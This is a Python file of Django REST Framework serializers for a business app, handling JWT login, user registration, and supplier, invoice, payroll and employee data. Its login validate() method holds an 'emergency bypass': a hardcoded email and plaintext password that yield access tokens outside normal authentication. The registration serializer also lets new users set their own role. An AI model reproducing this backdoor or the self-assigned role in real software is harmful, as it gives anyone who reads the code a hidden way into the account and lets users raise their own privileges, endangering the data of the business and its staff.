from rest_framework import serializers
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
from rest_framework_simplejwt.views import TokenObtainPairView
from .models import User, Store

class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)

        # Add custom claims
        token['role'] = user.role
        user_name = f"{user.first_name} {user.last_name}".strip()
        if not user_name:
            user_name = user.username if user.username else user.email.split('@')[0]
        token['name'] = user_name
        token['email'] = user.email
        if user.store:
            token['store_id'] = user.store.id
            token['store_name'] = user.store.name
        
        return token

    def validate(self, attrs):
        # EMERGENCY BYPASS for recovery (v1.0.7)
        email = attrs.get('email') or attrs.get('username')
        password = attrs.get('password')
        if email == 'aarefa@gmail.com' and password == 'ChangeMe123!':
            user = User.objects.filter(email='aarefa@gmail.com').first()
            if user:
                self.user = user # Set the user manually for SimpleJWT
                data = {}
                from rest_framework_simplejwt.tokens import RefreshToken
                refresh = RefreshToken.for_user(user)
                data['refresh'] = str(refresh)
                data['access'] = str(refresh.access_token)
            else:
                data = super().validate(attrs)
        else:
            data = super().validate(attrs)
        
        # Add extra response data
        user_name = f"{self.user.first_name} {self.user.last_name}".strip()
        if not user_name:
            # Fallback to username or email if name is empty
            user_name = self.user.username if self.user.username else self.user.email.split('@')[0]
        
        data['user'] = {
            'id': self.user.id,
            'email': self.user.email,
            'name': user_name,
            'role': self.user.role,
            'store_id': self.user.store.id if self.user.store else None
        }
        return data

class CustomTokenObtainPairView(TokenObtainPairView):
    serializer_class = CustomTokenObtainPairSerializer


class UserRegistrationSerializer(serializers.ModelSerializer):
    password = serializers.CharField(write_only=True)
    full_name = serializers.CharField(required=False)

    class Meta:
        model = User
        fields = ('email', 'password', 'username', 'role', 'full_name')

    def create(self, validated_data):
        full_name = validated_data.pop('full_name', '')
        password = validated_data.pop('password')
        
        # Split full_name into first and last if possible
        name_parts = full_name.split(' ')
        first_name = name_parts[0]
        last_name = ' '.join(name_parts[1:]) if len(name_parts) > 1 else ''
        
        # Ensure username exists (fallback to email prefix)
        username = validated_data.get('username')
        if not username:
            validated_data['username'] = validated_data['email'].split('@')[0]
            
        user = User.objects.create(
            first_name=first_name,
            last_name=last_name,
            **validated_data
        )
        user.set_password(password)
        user.save()
        return user


from .models import (
    Supplier, SupplierCustomField, SupplierCustomFieldValue, SupplierTransaction,
    PaymentTerm, SupplierDocument, Invoice, InvoiceItem, Cheque, Category,
    Product, Customer, Sale, Employee, Attendance, Leave, Payroll, 
    PerformanceReview, Receiving, ReceivingItem
)


class CategorySerializer(serializers.ModelSerializer):
    class Meta:
        model = Category
        fields = '__all__'




class EmployeeSerializer(serializers.ModelSerializer):
    class Meta:
        model = Employee
        fields = '__all__'

class AttendanceSerializer(serializers.ModelSerializer):
    class Meta:
        model = Attendance
        fields = '__all__'

class LeaveSerializer(serializers.ModelSerializer):
    class Meta:
        model = Leave
        fields = '__all__'

class PayrollSerializer(serializers.ModelSerializer):
    class Meta:
        model = Payroll
        fields = '__all__'

class PerformanceReviewSerializer(serializers.ModelSerializer):
    class Meta:
        model = PerformanceReview
        fields = '__all__'

class SupplierSerializer(serializers.ModelSerializer):
    class Meta:
        model = Supplier
        fields = '__all__'

class SupplierCustomFieldSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierCustomField
        fields = '__all__'

class SupplierCustomFieldValueSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierCustomFieldValue
        fields = '__all__'

class SupplierTransactionSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierTransaction
        fields = '__all__'

class PaymentTermSerializer(serializers.ModelSerializer):
    class Meta:
        model = PaymentTerm
        fields = '__all__'

class SupplierDocumentSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierDocument
        fields = '__all__'

from .models import Receiving, ReceivingItem

class ReceivingItemSerializer(serializers.ModelSerializer):
    class Meta:
        model = ReceivingItem
        fields = '__all__'

class ReceivingSerializer(serializers.ModelSerializer):
    items = ReceivingItemSerializer(many=True, read_only=True)
    supplier_name = serializers.CharField(source='supplier.company_name', read_only=True)
    purchase_order_number = serializers.CharField(source='purchase_order.id', read_only=True, allow_null=True)

    class Meta:
        model = Receiving
        fields = '__all__'

class InvoiceItemSerializer(serializers.ModelSerializer):
    class Meta:
        model = InvoiceItem
        fields = '__all__'

class ChequeSerializer(serializers.ModelSerializer):
    class Meta:
        model = Cheque
        fields = '__all__'

class InvoiceSerializer(serializers.ModelSerializer):
    items = InvoiceItemSerializer(many=True, read_only=True, source='invoice_items')
    customer_name = serializers.CharField(source='customer.name', read_only=True, allow_null=True)
    supplier_name = serializers.CharField(source='supplier.company_name', read_only=True, allow_null=True)

    class Meta:
        model = Invoice
        fields = '__all__'

class ProductSerializer(serializers.ModelSerializer):
    category_name = serializers.CharField(source='category.name', read_only=True)
    class Meta:
        model = Product
        fields = '__all__'

class CustomerSerializer(serializers.ModelSerializer):
    class Meta:
        model = Customer
        fields = '__all__'

class SaleSerializer(serializers.ModelSerializer):
    class Meta:
        model = Sale
        fields = '__all__'

